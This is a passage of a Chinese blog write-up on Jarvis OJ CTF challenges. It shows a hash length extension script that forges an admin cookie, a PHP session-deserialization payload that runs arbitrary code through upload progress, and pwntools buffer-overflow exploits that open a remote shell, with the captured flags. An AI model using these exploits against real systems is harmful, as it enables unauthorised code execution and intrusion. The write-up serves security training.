+</code></pre><p>这里我用的是 hash_extender （需要make一下），因为 mac 最新的 openssl 库就是装不上….丢去服务器上跑了，salt 长度未知，贴一份脚本：</p>
+<pre><code class="Python">from urlparse import urlparse
+from httplib import HTTPConnection
+from urllib import urlencode
+import json
+import time
+import os
+import urllib
+def gao(x, y):
+        #print x
+        #print y
+    url = &quot;http://web.jarvisoj.com:32778/index.php&quot;
+    cookie = &quot;role=&quot; + x + &quot;; hsh=&quot; + y
+        #print cookie
+    build_header = {
+            &#39;Cookie&#39;: cookie,
+            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0&#39;,
+            &#39;Host&#39;: &#39;web.jarvisoj.com:32778&#39;,
+            &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
+    }
+    urlparts = urlparse(url)
+    conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)
+    conn.request(&quot;GET&quot;, urlparts.path, &#39;&#39;, build_header)
+    resp = conn.getresponse()
+    body = resp.read()
+    return body
+for i in xrange(1000):
+    print i
+    # secret len = ???
+    find_hash = &quot;./hash_extender -d &#39;;\&quot;tseug\&quot;:5:s&#39; -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a &#39;;\&quot;nimda\&quot;:5:s&#39; --out-data-format=html -l &quot; + str(i) + &quot; --quiet&quot;
+    #print find_hash
+    calc_res = os.popen(find_hash).readlines()
+    hash_value = calc_res[0][:32]
+    attack_padding = calc_res[0][32:]
+    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])
+    ret = gao(attack_padding, hash_value)
+    if &quot;Welcome&quot; in ret:
+        print ret
+        break
+</code></pre>
+<p>得到回显：</p>
+<pre><code class="HTML">...
+12
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Web 350&lt;/title&gt;
+&lt;style type=&quot;text/css&quot;&gt;
+    body {
+        background:gray;
+        text-align:center;
+    }
+&lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h3&gt;Welcome Admin. Your flag is PCTF{H45h_ext3ndeR_i5_easy_to_us3} &lt;/h3&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>同时也可以知道 salt 的长度为12。</p>
+<hr>
+<h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p>题目入口：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
+<p>上来就给出了源码：</p>
+<pre><code class="PHP">&lt;?php
+//A webshell is wait for you
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); //设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = &#39;phpinfo();&#39;;
+    }
+
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+if(isset($_GET[&#39;phpinfo&#39;]))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents(&#39;index.php&#39;));
+}
+?&gt;
+</code></pre>
+<p>注意到 session.serialize_handler ，先放一篇关于 PHP 反序列化的<a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">文章</a>。</p>
+<p>PHP 内置了多种处理器用于在存取 $_SESSION 数据时，对数据进行序列化和反序列化：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">处理器</th>
+<th style="text-align:left">存储格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">php</td>
+<td style="text-align:left">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列化的值</td>
+</tr>
+<tr>
+<td style="text-align:left">php_binary</td>
+<td style="text-align:left">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列化的值</td>
+</tr>
+<tr>
+<td style="text-align:left">php_serialize (php&gt;=5.5.4)</td>
+<td style="text-align:left">经过 serialize() 函数反序列化的数组</td>
+</tr>
+</tbody>
+</table>
+<p>漏洞产生在 php_serialize 和 php 的解析方式上。如果我们用 php_serialize 的方式构造序列化语句，然后通过 php 解析语句，会出现一些问题，因为在使用 php_serialize 构造语句时我们可以使用 ‘|’ 这个符号，但是在 php 进行解析时会将 ‘|’ 符号前的数据当作数组中的键，其后的数据当作值，这个时候我们就可以构造特殊的语句来进行利用了。</p>
+<p>通过 phpinfo 页面可以获得的信息有：</p>
+<ol>
+<li>php 版本为 5.6.21 。</li>
+<li>php.ini 中默认的 session.serialize_handler 为 php_serialize ，而 index.php 中确将它设置成了 php （这就导致了 session 反序列化的问题）。</li>
+<li>session.upload_progress.enabled 的状态为 On 。</li>
+<li>session.upload_progress.cleanup 为关闭状态（提高了漏洞利用成功率）。</li>
+</ol>
+<p>要将数据注入到 session 中，一种情况是开发者本身将用户可控的数据传进了 session （比如 joomla 等）；另一方面则可通过 php 配置不当进行 session 控制，比如 session.upload_progress.enabled is on。当这个设置打开时，php 会记录上传文件的进度，在上传时会将其信息保存在 $_SESSION 中。</p>
+<p>下面开始漏洞利用。</p>
+<p>首先写一个提交表单备用：</p>
+<pre><code class="HTML">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;gogogo&quot; /&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+<p>因为不知道 flag 藏在哪里，先试着获取当前目录下的文件列表。构造 payload ：</p>
+<pre><code class="PHP">&lt;?php
+class OowoO
+{
+    public $mdzz=&#39;print_r(scandir(dirname(__FILE__)));&#39;;
+}
+$obj = new OowoO();
+echo serialize($obj);
+?&gt;
+</code></pre>
+<p>序列化结果为：</p>
+<pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}
+</code></pre><p>为了防止引号被转义，在前面加个杠，再把它改为 session 的格式，即在 payload 开头位置加个 ‘|’ ，修改后的 payload 如下：</p>
+<pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}
+</code></pre><p>Burp start ，利用刚刚写的提交表单随便传个东西上去，抓包，修改 filename 为 payload （开头的 ‘|’ 后面如果加了空格会导致 payload 失效，去掉就好了）：</p>
+<p><img src="/posts/jarvisoj-wp/PHPINFO-1.png" alt=""></p>
+<p>接下来就很简单了，去读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php 就好。首先查询 PHPINFO 中的 _SERVER[“SCRIPT_FILENAME”] 得到当前目录为 /opt/lampp/htdocs/ ，将原 ‘xxx’ 处改为:</p>
+<pre><code class="PHP">print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));
+</code></pre>
+<p>序列化及一些小处理后得到最终 payload ：</p>
+<pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}
+</code></pre><p>用同样的方式 POST 一下就好了。</p>
+<p><code>CTF{4d96e37f4be998c50aa586de4ada354a}</code></p>
+<hr>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h3><p>题目描述：</p>
+<blockquote>
+<p>nc pwn2.jarvisoj.com 9881</p>
+<p><a href="https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d" target="_blank" rel="noopener">level0.b9ded3801d6dd36a97468e128b81a65d</a></p>
+</blockquote>
+<p> ida 载入，先是 main 函数：</p>
+<pre><code>.text:00000000004005C6 ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:00000000004005C6                 public main
+.text:00000000004005C6 main            proc near               ; DATA XREF: _start+1D↑o
+.text:00000000004005C6
+.text:00000000004005C6 var_10          = qword ptr -10h
+.text:00000000004005C6 var_4           = dword ptr -4
+.text:00000000004005C6
+.text:00000000004005C6 ; __unwind {
+.text:00000000004005C6                 push    rbp
+.text:00000000004005C7                 mov     rbp, rsp
+.text:00000000004005CA                 sub     rsp, 10h
+.text:00000000004005CE                 mov     [rbp+var_4], edi
+.text:00000000004005D1                 mov     [rbp+var_10], rsi
+.text:00000000004005D5                 mov     edx, 0Dh        ; n
+.text:00000000004005DA                 mov     esi, offset aHelloWorld ; &quot;Hello, World\n&quot;
+.text:00000000004005DF                 mov     edi, 1          ; fd
+.text:00000000004005E4                 call    _write
+.text:00000000004005E9                 mov     eax, 0
+.text:00000000004005EE                 call    vulnerable_function
+.text:00000000004005F3                 leave
+.text:00000000004005F4                 retn
+.text:00000000004005F4 ; } // starts at 4005C6
+.text:00000000004005F4 main            endp
+</code></pre><p>vulnerable_function 函数：</p>
+<pre><code>.text:00000000004005A6                 public vulnerable_function
+.text:00000000004005A6 vulnerable_function proc near           ; CODE XREF: main+28↓p
+.text:00000000004005A6
+.text:00000000004005A6 buf             = byte ptr -80h
+.text:00000000004005A6
+.text:00000000004005A6 ; __unwind {
+.text:00000000004005A6                 push    rbp
+.text:00000000004005A7                 mov     rbp, rsp
+.text:00000000004005AA                 add     rsp, 0FFFFFFFFFFFFFF80h
+.text:00000000004005AE                 lea     rax, [rbp+buf]
+.text:00000000004005B2                 mov     edx, 200h       ; nbytes
+.text:00000000004005B7                 mov     rsi, rax        ; buf
+.text:00000000004005BA                 mov     edi, 0          ; fd
+.text:00000000004005BF                 call    _read
+.text:00000000004005C4                 leave
+.text:00000000004005C5                 retn
+.text:00000000004005C5 ; } // starts at 4005A6
+.text:00000000004005C5 vulnerable_function endp
+</code></pre><p>以及一个未曾被调用但是能够打开 shell 的 callsystem 函数：</p>
+<pre><code>.text:0000000000400596                 public callsystem
+.text:0000000000400596 callsystem      proc near
+.text:0000000000400596 ; __unwind {
+.text:0000000000400596                 push    rbp
+.text:0000000000400597                 mov     rbp, rsp
+.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;
+.text:000000000040059F                 call    _system
+.text:00000000004005A4                 pop     rbp
+.text:00000000004005A5                 retn
+.text:00000000004005A5 ; } // starts at 400596
+.text:00000000004005A5 callsystem      endp
+</code></pre><p>可以利用 vulnerable_function 中的 read 函数进行缓冲区溢出，进而跳转到 callsystem 函数以 get shell 。</p>
+<p>ctrl + k 查看该函数的栈帧，buf 的首地址与栈返回地址的距离差为 (+0000000000000008) - (-0000000000000080) ，即 0x88 ，callsystem 函数的地址为 0x400596 ，接下来就可以写 poc 了：</p>
+<pre><code class="Python">from pwn import *
+
+sh = remote(&#39;pwn2.jarvisoj.com&#39;, 9881)
+
+padding = &#39;A&#39; * 0x88
+add = p64(0x400596)
+payload = padding + add
+sh.send(payload)
+
+sh.interactive()
+</code></pre>
+<p>cat flag：</p>
+<p><code>CTF{713ca3944e92180e0ef03171981dcd41}</code></p>
+<h3 id="XMAN-level1"><a href="#XMAN-level1" class="headerlink" title="[XMAN]level1"></a>[XMAN]level1</h3><p>题目描述：</p>
+<blockquote>
+<p>nc pwn2.jarvisoj.com 9877</p>
+<p><a href="https://dn.jarvisoj.com/challengefiles/level1.80eacdcd51aca92af7749d96efad7fb5" target="_blank" rel="noopener">level1.80eacdcd51aca92af7749d96efad7fb5</a></p>
+</blockquote>
+<p>checksec 一下发现什么保护都没有开，这次是一个 32 位的程序，ida 载入之：</p>
+<p>main 函数：</p>
+<pre><code>.text:080484B7 ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:080484B7                 public main
+.text:080484B7 main            proc near               ; DATA XREF: _start+17↑o
+.text:080484B7
+.text:080484B7 var_4           = dword ptr -4
+.text:080484B7 argc            = dword ptr  8
+.text:080484B7 argv            = dword ptr  0Ch
+.text:080484B7 envp            = dword ptr  10h
+.text:080484B7
+.text:080484B7 ; __unwind {
+.text:080484B7                 lea     ecx, [esp+4]
+.text:080484BB                 and     esp, 0FFFFFFF0h
+.text:080484BE                 push    dword ptr [ecx-4]
+.text:080484C1                 push    ebp
+.text:080484C2                 mov     ebp, esp
+.text:080484C4                 push    ecx
+.text:080484C5                 sub     esp, 4
+.text:080484C8                 call    vulnerable_function
+.text:080484CD                 sub     esp, 4
+.text:080484D0                 push    0Eh             ; n
+.text:080484D2                 push    offset aHelloWorld ; &quot;Hello, World!\n&quot;
+.text:080484D7                 push    1               ; fd
+.text:080484D9                 call    _write
+.text:080484DE                 add     esp, 10h
+.text:080484E1                 mov     eax, 0
+.text:080484E6                 mov     ecx, [ebp+var_4]
+.text:080484E9                 leave
+.text:080484EA                 lea     esp, [ecx-4]
+.text:080484ED                 retn
+.text:080484ED ; } // starts at 80484B7
+.text:080484ED main            endp
+</code></pre><p>在调用 vulnerable_function 函数之后 printf “Hello, World!\n”。</p>
+<p>看一下 vulnerable_function 函数：</p>
+<pre><code>.text:0804847B                 public vulnerable_function
+.text:0804847B vulnerable_function proc near           ; CODE XREF: main+11↓p
+.text:0804847B
+.text:0804847B buf             = byte ptr -88h
+.text:0804847B
+.text:0804847B ; __unwind {
+.text:0804847B                 push    ebp
+.text:0804847C                 mov     ebp, esp
+.text:0804847E                 sub     esp, 88h
+.text:08048484                 sub     esp, 8
+.text:08048487                 lea     eax, [ebp+buf]
+.text:0804848D                 push    eax
+.text:0804848E                 push    offset format   ; &quot;What&#39;s this:%p?\n&quot;
+.text:08048493                 call    _printf
+.text:08048498                 add     esp, 10h
+.text:0804849B                 sub     esp, 4
+.text:0804849E                 push    100h            ; nbytes
+.text:080484A3                 lea     eax, [ebp+buf]
+.text:080484A9                 push    eax             ; buf
+.text:080484AA                 push    0               ; fd
+.text:080484AC                 call    _read
+.text:080484B1                 add     esp, 10h
+.text:080484B4                 nop
+.text:080484B5                 leave
+.text:080484B6                 retn
+.text:080484B6 ; } // starts at 804847B
+.text:080484B6 vulnerable_function endp
+</code></pre><p>这个函数首先打印出 buf 的首地址，然后从标准输入获取 100 字节写入 buf 中。buf 的长度为 0x04 - (-0x88) = 0x8c &lt; 0x100 ，又因为没有开启栈保护，会造成栈溢出。</p>
+<p>这样大致的思路就有了。先截取 buf 的首地址，在其中写入拿 shell 的 shellcode ，再用 buf 地址覆盖 vulnerable_function 函数的返回地址使之执行 system(“/bin/sh”) 。不过我们不知道 system 的地址，此时可以用 pwntools 中的 asm() 函数。</p>
+<p>asm() 函数可以接收一个字符串作为参数，得到汇编码的机器代码。 这里我们可以用 asm(shellcraft.sh()) 的方式得到目标地址，shellcraft.sh() 就是执行 /bin/sh 的 shellcode。</p>
+<p>按照 shellcode + nope*n + ret_address 这个格式就可以拿到 shell 了。</p>
+<p>poc: </p>
+<pre><code class="Python">from pwn import *
+
+sh = remote(&#39;pwn2.jarvisoj.com&#39;, 9877)
+shellcode = asm(shellcraft.sh()) 
+p_buf = int(sh.recvline()[14:-2], 16)
+#print (hex(p_buf))
+
+payload = shellcode + (0x8c-len(shellcode)) * &#39;\x90&#39; + p32(p_buf)
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
+<p>cat flag:  </p>
+<p><code>CTF{82c2aa534a9dede9c3a0045d0fec8617}</code></p>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            版权声明：本文遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank">CC BY-NC-SA 3.0</a> 协议，转载请注明出处。
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="https://blog.cyris.cn/posts/jarvisoj-wp/">https://blog.cyris.cn/posts/jarvisoj-wp/</a>
+                    </p>
+                </blockquote>
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/posts/hash-extender-attack/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            Newer
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/posts/rar-attack/" id="post_nav-older" class="next-content">
+            Older
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/cyris.png" alt="Cyris's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        i@cyris.top
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="mailto: i@cyris.top" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                Home
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    Archives
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2018/04/">April 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">March 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">February 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">November 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">October 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/07/">July 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/05/">May 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">April 2017<span class="sidebar_archives-count">2</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                Categories
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/CTF/">CTF<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/Crypto/">Crypto<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/Git/">Git<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/Hexo/">Hexo<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/Pwn/">Pwn<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/Python/">Python<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/学习资料/">学习资料<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/小笔记/">小笔记<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/煮字/">煮字<span class="sidebar_archives-count">4</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/timeline" title="Timeline">
+                
+                Timeline
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/about" title="About">
+                
+                About
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+    <div class="sidebar-divider"></div>
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://github.com/iCyris" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+        <a href="https://www.zhihu.com/people/icyris/activities" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-zhihu">
+                <span class="visuallyhidden">Zhihu</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>Cyris | 绿生
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+    
+        
+            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
+        
+    
+
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+        
+            $(function() {
+                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+                prettyPrint();
+                })
+        
+    
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
